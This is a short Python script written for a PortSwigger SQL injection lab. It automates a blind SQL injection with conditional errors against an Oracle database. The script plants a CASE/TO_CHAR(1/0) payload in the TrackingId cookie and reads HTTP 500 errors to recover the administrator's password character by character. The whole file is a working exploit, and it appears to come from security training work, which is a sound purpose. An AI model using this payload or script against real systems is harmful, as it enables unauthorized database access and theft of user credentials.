#! /bin/python3

# Made for PortSwigger SQLi Lab (BSQLi on Oracle w/ Conditional Errors)

import requests
from requests.structures import CaseInsensitiveDict

# Configurations

url = "https://0a1e0016043a6ef0c019377000bc0069.web-security-academy.net/login"

char_space = 'abcdefghijklmnopqrstuvwxyz01234567890'

expected_data_length = 25

expected_server_error = 500

table_name = "users"
column_name = "password"
filter_column_name = "username"
filter_column_data = "administrator"

extracted_data = ""

print("\n[!] Attack in Progress...\n")

# Data Extrapolation

for position in range(1, expected_data_length):

	for char in char_space:

		injection_string = f"'||(SELECT CASE WHEN SUBSTR({column_name},{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE {filter_column_name}='{filter_column_data}')||'"

		# Injection Vector
		
		headers = CaseInsensitiveDict()
		headers["Cookie"] = f"TrackingId=efbYMRNNA5hW91s7{injection_string}; session=QMPzWwwEPHKO2bowwjv6rhI8LAjuhAjd"

		resp = requests.get(url, headers=headers)

		if resp.status_code == expected_server_error:
		
			print("[+] Character #" + str(position) + " found!")
			extracted_data = extracted_data + char
			break
		
		else:
			pass

print("\n[!] Data Extracted: " + extracted_data)
